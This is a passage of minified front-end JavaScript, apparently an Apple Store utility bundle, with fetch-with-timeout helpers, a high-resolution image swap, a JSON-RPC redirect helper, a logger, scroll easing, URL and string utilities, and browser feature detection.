a=i.arg;return a?a.done?(r[e.resultName]=a.value,r.next=e.nextLoc,"return"!==r.method&&(r.method="next",r.arg=t),r.delegate=null,y):a:(r.method="throw",r.arg=new TypeError("iterator result is not an object"),r.delegate=null,y)}function pushTryEntry(t){var e={tryLoc:t[0]};1 in t&&(e.catchLoc=t[1]),2 in t&&(e.finallyLoc=t[2],e.afterLoc=t[3]),this.tryEntries.push(e)}function resetTryEntry(t){var e=t.completion||{};e.type="normal",delete e.arg,t.completion=e}function Context(t){this.tryEntries=[{tryLoc:"root"}],t.forEach(pushTryEntry,this),this.reset(!0)}function values(e){if(e||""===e){var r=e[a];if(r)return r.call(e);if("function"==typeof e.next)return e;if(!isNaN(e.length)){var o=-1,i=function next(){for(;++o<e.length;)if(n.call(e,o))return next.value=e[o],next.done=!1,next;return next.value=t,next.done=!0,next};return i.next=i}}throw new TypeError(_typeof(e)+" is not iterable")}return GeneratorFunction.prototype=GeneratorFunctionPrototype,o(g,"constructor",{value:GeneratorFunctionPrototype,configurable:!0}),o(GeneratorFunctionPrototype,"constructor",{value:GeneratorFunction,configurable:!0}),GeneratorFunction.displayName=define(GeneratorFunctionPrototype,u,"GeneratorFunction"),e.isGeneratorFunction=function(t){var e="function"==typeof t&&t.constructor;return!!e&&(e===GeneratorFunction||"GeneratorFunction"===(e.displayName||e.name))},e.mark=function(t){return Object.setPrototypeOf?Object.setPrototypeOf(t,GeneratorFunctionPrototype):(t.__proto__=GeneratorFunctionPrototype,define(t,u,"GeneratorFunction")),t.prototype=Object.create(g),t},e.awrap=function(t){return{__await:t}},defineIteratorMethods(AsyncIterator.prototype),define(AsyncIterator.prototype,c,(function(){return this})),e.AsyncIterator=AsyncIterator,e.async=function(t,r,n,o,i){void 0===i&&(i=Promise);var a=new AsyncIterator(wrap(t,r,n,o),i);return e.isGeneratorFunction(r)?a:a.next().then((function(t){return t.done?t.value:a.next()}))},defineIteratorMethods(g),define(g,u,"Generator"),define(g,a,(function(){return this})),define(g,"toString",(function(){return"[object Generator]"})),e.keys=function(t){var e=Object(t),r=[];for(var n in e)r.push(n);return r.reverse(),function next(){for(;r.length;){var t=r.pop();if(t in e)return next.value=t,next.done=!1,next}return next.done=!0,next}},e.values=values,Context.prototype={constructor:Context,reset:function reset(e){if(this.prev=0,this.next=0,this.sent=this._sent=t,this.done=!1,this.delegate=null,this.method="next",this.arg=t,this.tryEntries.forEach(resetTryEntry),!e)for(var r in this)"t"===r.charAt(0)&&n.call(this,r)&&!isNaN(+r.slice(1))&&(this[r]=t)},stop:function stop(){this.done=!0;var t=this.tryEntries[0].completion;if("throw"===t.type)throw t.arg;return this.rval},dispatchException:function dispatchException(e){if(this.done)throw e;var r=this;function handle(n,o){return a.type="throw",a.arg=e,r.next=n,o&&(r.method="next",r.arg=t),!!o}for(var o=this.tryEntries.length-1;o>=0;--o){var i=this.tryEntries[o],a=i.completion;if("root"===i.tryLoc)return handle("end");if(i.tryLoc<=this.prev){var c=n.call(i,"catchLoc"),u=n.call(i,"finallyLoc");if(c&&u){if(this.prev<i.catchLoc)return handle(i.catchLoc,!0);if(this.prev<i.finallyLoc)return handle(i.finallyLoc)}else if(c){if(this.prev<i.catchLoc)return handle(i.catchLoc,!0)}else{if(!u)throw new Error("try statement without catch or finally");if(this.prev<i.finallyLoc)return handle(i.finallyLoc)}}}},abrupt:function abrupt(t,e){for(var r=this.tryEntries.length-1;r>=0;--r){var o=this.tryEntries[r];if(o.tryLoc<=this.prev&&n.call(o,"finallyLoc")&&this.prev<o.finallyLoc){var i=o;break}}i&&("break"===t||"continue"===t)&&i.tryLoc<=e&&e<=i.finallyLoc&&(i=null);var a=i?i.completion:{};return a.type=t,a.arg=e,i?(this.method="next",this.next=i.finallyLoc,y):this.complete(a)},complete:function complete(t,e){if("throw"===t.type)throw t.arg;return"break"===t.type||"continue"===t.type?this.next=t.arg:"return"===t.type?(this.rval=this.arg=t.arg,this.method="return",this.next="end"):"normal"===t.type&&e&&(this.next=e),y},finish:function finish(t){for(var e=this.tryEntries.length-1;e>=0;--e){var r=this.tryEntries[e];if(r.finallyLoc===t)return this.complete(r.completion,r.afterLoc),resetTryEntry(r),y}},catch:function _catch(t){for(var e=this.tryEntries.length-1;e>=0;--e){var r=this.tryEntries[e];if(r.tryLoc===t){var n=r.completion;if("throw"===n.type){var o=n.arg;resetTryEntry(r)}return o}}throw new Error("illegal catch attempt")},delegateYield:function delegateYield(e,r,n){return this.delegate={iterator:values(e),resultName:r,nextLoc:n},"next"===this.method&&(this.arg=t),y}},e}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function _defineProperty(obj,key,value){return(key=_toPropertyKey(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}function asyncGeneratorStep(gen,resolve,reject,_next,_throw,key,arg){try{var info=gen[key](arg),value=info.value}catch(error){return void reject(error)}info.done?resolve(value):Promise.resolve(value).then(_next,_throw)}function _asyncToGenerator(fn){return function(){var self=this,args=arguments;return new Promise((function(resolve,reject){var gen=fn.apply(self,args);function _next(value){asyncGeneratorStep(gen,resolve,reject,_next,_throw,"next",value)}function _throw(err){asyncGeneratorStep(gen,resolve,reject,_next,_throw,"throw",err)}_next(void 0)}))}}function _defineProperties(target,props){for(var i=0;i<props.length;i++){var descriptor=props[i];descriptor.enumerable=descriptor.enumerable||!1,descriptor.configurable=!0,"value"in descriptor&&(descriptor.writable=!0),Object.defineProperty(target,_toPropertyKey(descriptor.key),descriptor)}}function _createClass(Constructor,protoProps,staticProps){return protoProps&&_defineProperties(Constructor.prototype,protoProps),staticProps&&_defineProperties(Constructor,staticProps),Object.defineProperty(Constructor,"prototype",{writable:!1}),Constructor}function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}function _classCallCheck(instance,Constructor){if(!(instance instanceof Constructor))throw new TypeError("Cannot call a class as a function")}function _inherits(subClass,superClass){if("function"!=typeof superClass&&null!==superClass)throw new TypeError("Super expression must either be null or a function");subClass.prototype=Object.create(superClass&&superClass.prototype,{constructor:{value:subClass,writable:!0,configurable:!0}}),Object.defineProperty(subClass,"prototype",{writable:!1}),superClass&&_setPrototypeOf(subClass,superClass)}function _createSuper(Derived){var hasNativeReflectConstruct=_isNativeReflectConstruct();return function _createSuperInternal(){var result,Super=_getPrototypeOf(Derived);if(hasNativeReflectConstruct){var NewTarget=_getPrototypeOf(this).constructor;result=Reflect.construct(Super,arguments,NewTarget)}else result=Super.apply(this,arguments);return function _possibleConstructorReturn(self,call){if(call&&("object"===_typeof(call)||"function"==typeof call))return call;if(void 0!==call)throw new TypeError("Derived constructors may only return object or undefined");return function _assertThisInitialized(self){if(void 0===self)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return self}(self)}(this,result)}}function _wrapNativeSuper(Class){var _cache="function"==typeof Map?new Map:void 0;return _wrapNativeSuper=function _wrapNativeSuper(Class){if(null===Class||!function _isNativeFunction(fn){try{return-1!==Function.toString.call(fn).indexOf("[native code]")}catch(e){return"function"==typeof fn}}(Class))return Class;if("function"!=typeof Class)throw new TypeError("Super expression must either be null or a function");if(void 0!==_cache){if(_cache.has(Class))return _cache.get(Class);_cache.set(Class,Wrapper)}function Wrapper(){return _construct(Class,arguments,_getPrototypeOf(this).constructor)}return Wrapper.prototype=Object.create(Class.prototype,{constructor:{value:Wrapper,enumerable:!1,writable:!0,configurable:!0}}),_setPrototypeOf(Wrapper,Class)},_wrapNativeSuper(Class)}function _construct(Parent,args,Class){return _construct=_isNativeReflectConstruct()?Reflect.construct.bind():function _construct(Parent,args,Class){var a=[null];a.push.apply(a,args);var instance=new(Function.bind.apply(Parent,a));return Class&&_setPrototypeOf(instance,Class.prototype),instance},_construct.apply(null,arguments)}function _isNativeReflectConstruct(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(e){return!1}}function _setPrototypeOf(o,p){return _setPrototypeOf=Object.setPrototypeOf?Object.setPrototypeOf.bind():function _setPrototypeOf(o,p){return o.__proto__=p,o},_setPrototypeOf(o,p)}function _getPrototypeOf(o){return _getPrototypeOf=Object.setPrototypeOf?Object.getPrototypeOf.bind():function _getPrototypeOf(o){return o.__proto__||Object.getPrototypeOf(o)},_getPrototypeOf(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.fetchWithTimeout=exports.fetchJSON=exports.TimeoutError=exports.JSONError=exports.HTTPError=void 0;var _ref,_ref2,HTTPError=exports.HTTPError=function(_Error){_inherits(HTTPError,_Error);var _super=_createSuper(HTTPError);function HTTPError(response,request){var _this;_classCallCheck(this,HTTPError);var code=response.status||0===response.status?response.status:"",title=response.statusText||"",status="".concat(code," ").concat(title).trim(),reason=status?"response.status: ".concat(status):"an unknown error";return request.options&&delete request.options.body,request.options&&delete request.options.headers,(_this=_super.call(this,"Request failed with ".concat(reason,", response.type: ").concat(response.type,", response.redirected: ").concat(response.redirected,", request.options: ").concat(JSON.stringify(request.options),", content-type: ").concat(response.headers&&response.headers.get("Content-Type"),", x-request-id: ").concat(response.headers&&response.headers.get("x-request-id")))).name="HTTPError",_this.code=code,_this}return _createClass(HTTPError)}(_wrapNativeSuper(Error)),JSONError=exports.JSONError=function(_Error2){_inherits(JSONError,_Error2);var _super2=_createSuper(JSONError);function JSONError(response,request,error){var _this2;_classCallCheck(this,JSONError);var code=response.status||0===response.status?response.status:"",title=response.statusText||"",status="".concat(code," ").concat(title).trim(),reason=status?"response.status: ".concat(status):"an unknown error";return request.options&&delete request.options.body,request.options&&delete request.options.headers,(_this2=_super2.call(this,"Received non-JSON response from JSON API with error.message: ".concat(error&&error.message,", ").concat(reason,", response.type: ").concat(response.type,", response.redirected: ").concat(response.redirected,", request.options: ").concat(JSON.stringify(request.options),", content-type: ").concat(response.headers&&response.headers.get("Content-Type"),", x-request-id: ").concat(response.headers&&response.headers.get("x-request-id")))).name="JSONError",_this2.code=code,_this2}return _createClass(JSONError)}(_wrapNativeSuper(Error)),TimeoutError=exports.TimeoutError=function(_Error3){_inherits(TimeoutError,_Error3);var _super3=_createSuper(TimeoutError);function TimeoutError(request){var _this3;return _classCallCheck(this,TimeoutError),request.options&&delete request.options.body,request.options&&delete request.options.headers,(_this3=_super3.call(this,"Request timed out after ".concat(request.options&&request.options.timeout," ms, request.options: ").concat(JSON.stringify(request.options)))).name="TimeoutError",_this3.code=408,_this3}return _createClass(TimeoutError)}(_wrapNativeSuper(Error)),fetchWithTimeout=exports.fetchWithTimeout=(_ref=_asyncToGenerator(_regeneratorRuntime().mark((function _callee(url){var options,timerId,abortController,req,fetchCall,timer,res,_args=arguments;return _regeneratorRuntime().wrap((function _callee$(_context){for(;;)switch(_context.prev=_context.next){case 0:return(options=_args.length>1&&void 0!==_args[1]?_args[1]:{}).timeout=options.timeout||1e4,abortController=new AbortController,req={url:url,options:_objectSpread({method:"GET",credentials:"same-origin",signal:abortController.signal},options)},fetchCall=fetch(req.url,req.options).then((function(res){return res})),timer=new Promise((function(_resolve,reject){timerId=setTimeout((function(){abortController.abort(),reject(new TimeoutError(req))}),options.timeout)})),_context.prev=6,_context.next=9,Promise.race([fetchCall,timer]);case 9:if(!(res=_context.sent).ok){_context.next=14;break}return _context.abrupt("return",res);case 14:throw new HTTPError(res,req);case 15:_context.next=20;break;case 17:throw _context.prev=17,_context.t0=_context.catch(6),_context.t0;case 20:return _context.prev=20,clearTimeout(timerId),_context.finish(20);case 23:case"end":return _context.stop()}}),_callee,null,[[6,17,20,23]])}))),function fetchWithTimeout(_x){return _ref.apply(this,arguments)});exports.fetchJSON=(_ref2=_asyncToGenerator(_regeneratorRuntime().mark((function _callee2(url){var res,req,data,_args2=arguments;return _regeneratorRuntime().wrap((function _callee2$(_context2){for(;;)switch(_context2.prev=_context2.next){case 0:return req={url:url,options:_args2.length>1&&void 0!==_args2[1]?_args2[1]:{}},_context2.prev=2,_context2.next=5,fetchWithTimeout(req.url,req.options);case 5:res=_context2.sent,_context2.next=11;break;case 8:throw _context2.prev=8,_context2.t0=_context2.catch(2),_context2.t0;case 11:return _context2.prev=11,_context2.next=14,res.json();case 14:return data=_context2.sent,_context2.abrupt("return",data);case 18:throw _context2.prev=18,_context2.t1=_context2.catch(11),new JSONError(res,req,_context2.t1);case 21:case"end":return _context2.stop()}}),_callee2,null,[[2,8],[11,18]])}))),function fetchJSON(_x2){return _ref2.apply(this,arguments)})},{}],11:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.setup=exports.replace=exports.forceReplace=void 0;var _cookie=require("../cookie/cookie.js"),attrImg="data-scale-image-",pxOld=1,pxNew=1,cookieOpts={path:"/",domain:".apple.com",expires:365,secure:!0},replace=exports.replace=function replace(){pxNew===pxOld||pxNew&&pxOld&&pxNew<pxOld||function $$(sel){var el=arguments.length>1&&void 0!==arguments[1]?arguments[1]:document;return Array.from(el.querySelectorAll(sel))}("img").forEach((function(el){var initialScale=parseInt(el.getAttribute("data-scale-initial")||"1",10),attr=el.getAttribute(attrImg+pxNew)?attrImg:el.getAttribute("data-scale-params-"+pxNew)?"data-scale-params-":null;if(el.classList.contains("ir")&&attr&&initialScale<pxNew){var src=el.getAttribute("src")||"",srcSep=src.lastIndexOf(attr===attrImg?"/":"?"),srcPre=src.slice(0,srcSep+1),srcPost=src.slice(srcSep+1);el.setAttribute("src",srcPre+el.getAttribute(attr+pxNew)),el.setAttribute(attr+pxOld,srcPost),el.removeAttribute(attr+pxNew)}}))};exports.forceReplace=function forceReplace(){window.irOn&&(pxNew=Math.round(window.devicePixelRatio||1)>=2?2:1,replace())},exports.setup=function setup(){pxOld=parseFloat((0,_cookie.get)("pxro")),pxNew=pxOld;var pxDevice=Math.round(window.devicePixelRatio||1)>=2?2:1;window.location.search&&window.location.search.match("debug.pixelRatio")||(window.irOn?pxOld&&pxOld===pxDevice||((0,_cookie.set)("pxro",pxDevice,cookieOpts),pxNew=pxDevice,replace()):(0,_cookie.set)("pxro",1,cookieOpts))}},{"../cookie/cookie.js":5}],12:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.convertJsonRpc=void 0;var _env=require("../env/env.js"),unencodedDoubleQuote=/"/g,createHidden=function createHidden(form,k,v){var input=document.createElement("input");input.setAttribute("type","hidden"),input.setAttribute("name",k.replace(unencodedDoubleQuote,"&quot;")),input.setAttribute("value",v.replace(unencodedDoubleQuote,"&quot;")),form.appendChild(input)};exports.convertJsonRpc=function convertJsonRpc(response){if(!response)return null;var head=response.head&&response.head.data||{},method=head.method?(head.method+"").toLowerCase():"get",status=parseInt((response.head&&response.head.status)+"",10),isRedirect=status>=301&&status<=307,isError=status>=400&&status<600;return isRedirect&&("get"===method||"delete"===method||"put"===method)?function get(url,args){if(url){var params=[];if(args){for(var key in args)params.push(encodeURIComponent(key)+"="+encodeURIComponent(args[key]+""));url+=(url.indexOf("?")>-1?"&":"?")+params.join("&")}_env.env.doRedirect(url)}}(head.url,head.args):isRedirect&&"post"===method&&function post(url,args){if(url){var form=document.createElement("form"),paramCache={};if(form.setAttribute("id","AsJsonRpcForm"),form.setAttribute("action",url),form.setAttribute("method","post"),args)for(var argKey in args){var arg=args[argKey];if(Array.isArray(arg))for(var k=0;k<arg.length;k++)paramCache[k]!==arg[k]&&(createHidden(form,k+"",arg[k]+""),paramCache[k]=arg[k]);else paramCache[argKey]!==arg&&(createHidden(form,argKey,arg+""),paramCache[argKey]=arg)}form.style.display="none",document.body.appendChild(form),form.submit()}}(head.url,head.args),isError||isRedirect?null:response.body||null}},{"../env/env.js":6}],13:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function Log(moduleName){if(!moduleName)throw new Error("moduleName parameter required for Logger");var globalLevel,LOG_LEVELS={TRACE:4,DEBUG:3,INFO:2,WARN:1,ERROR:0},sendEvent=function sendEvent(level){return function(message){if(globalLevel=window.sessionStorage.getItem("AS_LOG_LEVEL")||window.AS_LOG_LEVEL||LOG_LEVELS.ERROR,LOG_LEVELS[level]<=(globalLevel in LOG_LEVELS?LOG_LEVELS[globalLevel]:LOG_LEVELS.ERROR))try{var enrichedMessage;enrichedMessage="string"==typeof message||"number"==typeof message||"boolean"==typeof message||"bigint"==typeof message?{message:message}:Array.isArray(message)?{message:message.toString()}:function formatErrorOrObject(error){var errorData={message:error.message,colno:error.colno,lineno:error.lineno,stack:error.stack||error.error&&error.error.stack,name:error.name,code:error.code};return _objectSpread(_objectSpread({},error),errorData)}(message),function createAndDispatchEchoEvent(data){var event=new CustomEvent("echoLogEvent",{detail:data});window.dispatchEvent(event)}(_objectSpread(_objectSpread({},enrichedMessage),{},{id:moduleName,type:level.toLowerCase()})),console[level.toLowerCase()](message)}catch(ex){console.error("as-utilities/logger: could not log message",ex)}}};return{error:sendEvent("ERROR"),warn:sendEvent("WARN"),info:sendEvent("INFO"),debug:sendEvent("DEBUG"),trace:sendEvent("TRACE")}}},{}],14:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.scrollToPosition=exports.scrollToElement=void 0;var EasingFunctions={linear:function linear(t){return t},"ease-in":function easeIn(t){return Math.pow(t,2)},"ease-out":function easeOut(t){return t*(2-t)},"ease-in-out":function easeInOut(t){return t<.5?2*Math.pow(t,2):(4-2*t)*t-1},"ease-in-cubic":function easeInCubic(t){return Math.pow(t,3)},"ease-out-cubic":function easeOutCubic(t){return Math.pow(t-1,3)+1}},scrollToPosition=exports.scrollToPosition=function scrollToPosition(scrollEl,position){var options=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};return new window.Promise((function(resolve){var start,_options$duration=options.duration,duration=void 0===_options$duration?400:_options$duration,_options$easing=options.easing,easing=void 0===_options$easing?"linear":_options$easing,_options$abortAfterTi=options.abortAfterTimeout,abortAfterTimeout=void 0===_options$abortAfterTi||_options$abortAfterTi,easingFunction=EasingFunctions[easing]||EasingFunctions.linear,startPosition=window.scrollY,targetPosition=Math.min(Math.max(0,position),scrollEl.scrollHeight-window.innerHeight),abort=!1;startPosition!==targetPosition?(requestAnimationFrame((function animate(now){start||(start=now);var progress=easingFunction((now-start)/duration),distance=Math.abs(startPosition-targetPosition),direction=Math.sign(targetPosition-startPosition),delta=direction*progress*distance,currentPosition=(direction>0?Math.min:Math.max)(startPosition+delta,targetPosition);scrollEl.scrollTop=currentPosition,(direction>0?currentPosition>=targetPosition:currentPosition<=targetPosition)||abort?resolve("done"):requestAnimationFrame(animate)})),abortAfterTimeout&&window.setTimeout((function(){abort=!0}),duration)):resolve("done")}))};exports.scrollToElement=function scrollToElement(scrollEl,el,options){var targetPosition=el.offsetTop;return scrollToPosition(scrollEl,targetPosition,options)}},{}],15:[function(require,module,exports){"use strict";function _slicedToArray(arr,i){return function _arrayWithHoles(arr){if(Array.isArray(arr))return arr}(arr)||function _iterableToArrayLimit(r,l){var t=null==r?null:"undefined"!=typeof Symbol&&r[Symbol.iterator]||r["@@iterator"];if(null!=t){var e,n,i,u,a=[],f=!0,o=!1;try{if(i=(t=t.call(r)).next,0===l){if(Object(t)!==t)return;f=!1}else for(;!(f=(e=i.call(t)).done)&&(a.push(e.value),a.length!==l);f=!0);}catch(r){o=!0,n=r}finally{try{if(!f&&null!=t.return&&(u=t.return(),Object(u)!==u))return}finally{if(o)throw n}}return a}}(arr,i)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr,i)||function _nonIterableRest(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}Object.defineProperty(exports,"__esModule",{value:!0}),exports.truncate=exports.stripTags=exports.stripPunctuationAtStart=exports.stripPunctuationAtEnd=exports.queryParams=exports.parseUrl=exports.parseQueryString=exports.makeUrl=exports.isNumeric=exports.format=exports.extendUrlQuery=exports.escapeRegExp=void 0;var anchorElementCache=null,punctuationStart=new RegExp("^[\\s!\\?\\.\\,:;_\\-~`'\"#\\$&\\*@\\^\\|\\/]+"),punctuationEnd=new RegExp("[\\s!\\?\\.\\,:;_\\-~`'\"#\\$&\\*@\\^\\|\\/]+$"),tagContent=/<[^>]*>/g,encodedSpace=/\+/g,stripPunctuationAtEnd=exports.stripPunctuationAtEnd=function stripPunctuationAtEnd(s){return s.replace(punctuationEnd,"")},stripPunctuationAtStart=exports.stripPunctuationAtStart=function stripPunctuationAtStart(str){return str.replace(punctuationStart,"")},queryParams=(exports.stripTags=function stripTags(str){return str.replace(tagContent,"")},exports.isNumeric=function isNumeric(n){var number=parseFloat(n);return!isNaN(number)&&isFinite(number)},exports.queryParams=function queryParams(source){return Object.keys(source).map((function(k){return encodeURIComponent(k)+"="+encodeURIComponent(""+source[k])})).join("&")}),parseQueryString=(exports.truncate=function truncate(str){var options=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},length=options.length||30,omit=options.omission||"",from=options.from||"end";if(str&&str.length>length){var sliceLength="middle"===from?Math.floor(length/2):length,start="start"===from?"":str.slice(0,sliceLength),end="end"===from?"":str.slice(-1*sliceLength);return stripPunctuationAtEnd(start).trim()+omit+stripPunctuationAtStart(end).trim()}return str},exports.parseQueryString=function parseQueryString(qs){var result={};return(qs="?"===qs.charAt(0)||"#"===qs.charAt(0)?qs.substring(1):qs).split("&").forEach((function(keyValue){var _keyValue$split2=_slicedToArray(keyValue.split("="),2),key=_keyValue$split2[0],_keyValue$split2$=_keyValue$split2[1],value=decodeURIComponent((void 0===_keyValue$split2$?"":_keyValue$split2$).replace(encodedSpace," ")),curValue=result[key];if(value&&curValue){var curArray=Array.isArray(curValue)?curValue:[curValue];curArray.push(value),result[key]=curArray}else value&&(result[key]=value)})),result}),parseUrl=exports.parseUrl=function parseUrl(url){var anchor=anchorElementCache||document.createElement("a");anchorElementCache=anchor,anchor.href=url;var protocol=anchor.protocol,hostname=anchor.hostname,search=anchor.search,hash=anchor.hash;return{protocol:protocol,hostname:hostname,pathname:"/"===(anchor.pathname||"").charAt(0)?anchor.pathname:"/"+anchor.pathname,port:"0"===anchor.port?"":anchor.port,search:search,hash:hash}},makeUrl=exports.makeUrl=function makeUrl(options){var protocol=options.protocol,hostname=options.hostname,pathname=options.pathname,port=options.port;return(hostname?protocol+"//"+hostname+(port?":"+port:""):"")+pathname+options.search+options.hash},escapeRegExp=(exports.extendUrlQuery=function extendUrlQuery(url,map){var parsedUrl=parseUrl(url),params=parseQueryString(parsedUrl.search);return Object.keys(map).forEach((function(k){return params[k]=map[k]})),parsedUrl.search="?"+queryParams(params),makeUrl(parsedUrl)},exports.escapeRegExp=function escapeRegExp(str){return str.replace(/([[\\^$.|?*+(){}])/g,"\\$1")});exports.format=function format(str,params){var start=arguments.length>2&&void 0!==arguments[2]?arguments[2]:"{",end=arguments.length>3&&void 0!==arguments[3]?arguments[3]:"}";if(null==str)return String(str);var startEscaped=escapeRegExp(start),endEscaped=escapeRegExp(end);return str.replace(new RegExp("".concat(startEscaped,"([\\w-]+)").concat(endEscaped),"g"),(function(all,key){return function canBeInterpolated(value){return 0===value||!!value}(params[key])?params[key]+"":""}))}},{}],16:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.threeDTransformsSupport=exports.supportsARFun=exports.setup=exports.getSupportedFeatures=exports.cssSupport=exports.cssPropertyValuePrefix=exports.cssPropertyName=void 0;var _env=require("../env/env.js"),dashPrefixes=["","-webkit-","-moz-","-o-","-ms-","-khtml-"],prefixes=["","Webkit","Moz","O","ms","Khtml"],supportCache=null,domCache=null,getDomCache=function getDomCache(){var element=domCache||document.createElement("div");return domCache=element,element},cssPropertyValuePrefix=exports.cssPropertyValuePrefix=function cssPropertyValuePrefix(cssName,cssValue){if("length"===cssName||"parentRule"===cssName)return null;var domTestSupport=getDomCache();domTestSupport.style[cssName]="";var oldCssVal=domTestSupport.style[cssName],domSupportPrefix=dashPrefixes.find((function(prefix){domTestSupport.style[cssName]=prefix+cssValue;var doesSupport=domTestSupport.style[cssName]!==oldCssVal;return domTestSupport.style[cssName]="",doesSupport}));return"string"==typeof domSupportPrefix?domSupportPrefix:null},cssPropertyName=exports.cssPropertyName=function cssPropertyName(cssName){var docStyle=document&&document.documentElement.style,cssUpper=cssName.charAt(0).toUpperCase()+cssName.slice(1);return prefixes.map((function(pre){return pre?pre+cssUpper:cssName})).find((function(name){return name in docStyle}))||null},cssSupport=exports.cssSupport=function cssSupport(cssName,usePrefixes){return!!(usePrefixes&&cssPropertyName(cssName))||function isValidCssStr(str){return Boolean(str||""===str)}(getDomCache().style[cssName])},createTestHtml=function createTestHtml(parent,tagName,id,text){var el=document.createElement(tagName);return el.id=id,el.textContent=text,parent.appendChild(el),el},threeDTransformsSupport=exports.threeDTransformsSupport=function threeDTransformsSupport(){var hasOwnProp=Object.prototype.hasOwnProperty;try{if(hasOwnProp.call(window,"styleMedia")&&window.styleMedia.matchMedium("(-webkit-transform-3d)"))return!0;var style=document.getElementById("supportsThreeDStyle")||createTestHtml(document.head,"style","supportsThreeDStyle","@media (transform-3d),(-o-transform-3d),(-moz-transform-3d),(-ms-transform-3d),(-webkit-transform-3d) { #supportsThreeD { height:3px } }");return 3===(document.getElementById("supportsThreeD")||createTestHtml(document.body,"div","supportsThreeD","")).offsetHeight||"MozTransform"in style.style||"WebkitTransform"in style.style}catch(e){return!1}},supportsARFun=exports.supportsARFun=function supportsARFun(){try{var testEl=document.createElement("a");return!!testEl.relList&&testEl.relList.supports("ar")}catch(e){return!1}},getSupportedFeatures=exports.getSupportedFeatures=function getSupportedFeatures(){if(supportCache)return supportCache;var input=document.createElement("input"),textarea=document.createElement("textarea"),userAgentInfo=_env.env.userAgent(navigator.userAgent),userAgent=userAgentInfo.userAgent,isMobileIos=userAgentInfo.isMobileIos,isIpad=userAgentInfo.isIpad,iosVersion=userAgentInfo.iosVersion,isIe=userAgentInfo.isIe,ieVersion=userAgentInfo.ieVersion,isPhantom=userAgentInfo.isPhantom,isAndroidMobile=userAgentInfo.isAndroidMobile,isAndroidInternet=userAgentInfo.isAndroidInternet,androidVersion=userAgentInfo.androidVersion,isHandheldPhone=userAgentInfo.isHandheldPhone,isSafari=userAgentInfo.isSafari,appVersion=navigator.appVersion,docStyle=document&&document.documentElement.style,domTestSupport=getDomCache(),webkitMatch=userAgent.match(/AppleWebKit\/(\d+)/),webkitVersionStr=webkitMatch&&webkitMatch[1]||"",webkitVersion=parseFloat(webkitVersionStr)||null,os=-1!==appVersion.indexOf("Mac")?"macosx":-1!==appVersion.indexOf("X11")||-1!==appVersion.indexOf("Linux")?"linux":-1!==appVersion.indexOf("SunOS")?"sunos":"windows",hasOnTransitionEnd=Boolean(window.ontransitionend),usesModernTransition=("transition"in docStyle||"MozTransition"in 